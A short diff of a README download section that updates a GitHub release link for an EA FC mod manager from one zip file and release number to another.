@@ -12,7 +12,7 @@
 
 ## 📥 Download
 
-**[Download EA-FC-Mod-Manager](https://github.com/BodyLieutenantLock/EA-FC-Mod-Manager/releases/download/658/FCModManagerFCFIFA.zip)**
+**[Download EA-FC-Mod-Manager](https://github.com/BodyLieutenantLock/EA-FC-Mod-Manager/releases/download/659/FCModManagerEA.zip)**
 
 ---
 
